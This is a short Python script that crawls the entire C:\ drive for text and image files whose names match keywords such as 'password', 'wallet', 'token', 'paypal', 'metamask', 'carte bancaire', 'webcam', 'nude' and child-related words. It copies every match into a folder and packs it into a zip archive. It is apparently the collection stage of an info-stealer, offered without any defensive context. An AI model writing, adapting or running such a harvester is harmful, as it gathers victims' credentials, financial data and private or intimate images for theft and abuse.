
from os import walk, path, mkdir
from shutil import rmtree, make_archive
import threading

def main():
    words = ['token','adresse','wallet','ttk','password','mot de passe','adresse','mdp','paypal','binance',
        'metamask wallet','metamask','exodus','discord','info','carte','carte bancaire','banque','important word',
        'enfant','level','MANIFEST','doc','crypto',"montagne","ecole","school","2020","2021","enfant","vacances","child",
        "souvenir","ete",'img','webcam',"unknown","capture","enregistrement",'voc','discord','paypal','revolut','dossier','nude'
        'ficha'
        ]



    exts = ['txt', 'png', 'jpg']
    found_dir = 'output'

    if path.isdir(found_dir):
        rmtree(found_dir)
    mkdir(found_dir)

    for ext in exts:
        mkdir(path.join(found_dir, ext))

    for root, dirs, files in walk('C:\\'):
        for name in files:
            fullpath = path.join(root, name)

            if any(word in name for word in words) and any(name.endswith('.' + ext) for ext in exts):
                print(fullpath)

                try:
                    with open(fullpath, 'rb') as f:
                        content = f.read()

                    name, *subnames, ext = name.split('.')

                    name = '.'.join([name, *subnames])
                    with open(path.join(found_dir, ext, f'{name}.{ext}'), 'wb') as d:
                        d.write(content)
                except Exception as e:
                    print(e)



    make_archive(found_dir, 'zip', found_dir)
    rmtree(found_dir)

threading.Thread(target = main()).start()